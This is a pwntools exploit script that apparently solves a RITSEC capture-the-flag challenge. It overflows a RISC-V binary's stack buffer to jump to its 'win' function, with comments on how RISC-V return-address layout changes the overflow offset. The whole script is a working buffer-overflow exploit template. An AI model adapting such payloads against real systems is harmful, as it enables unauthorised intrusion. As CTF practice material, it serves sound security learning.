#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './clue'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'ctf.ritsec.club', 30839

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     riscv64-64-little
# RELRO:    No RELRO
# Stack:    Canary found ????
# NX:       NX enabled
# PIE:      No PIE (0x10000)

def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    # RISC-V pwn references:
    # https://github.com/datajerk/ctf-write-ups/tree/master/nahamconctf2022/riscky
    # https://github.com/nobodyisnobody/write-ups/tree/main/nullcon.HackIM.2022/pwn/typical.ROP

    # unlike 8086, RISC-V doesn't push return address to the stack when calling a function
    # RISC-V doesn't operate on push or pop. RISC-V simply allocates a stackframe on call 
    # and the return address is in the stackframe.

    # the basic formula if you're on 8086 and your offset to controlling rip is 40 bytes,
    # then you would fill 40 bytes of garbage then your ROP Chain.

    # in RISC-V you would start your ROP Chain on your offset - 8

    offset = 0x78 - 8
    payload = flat({
        offset: [
            elf.sym['win']
        ]
    })
    io.sendlineafter(b'answer:', payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()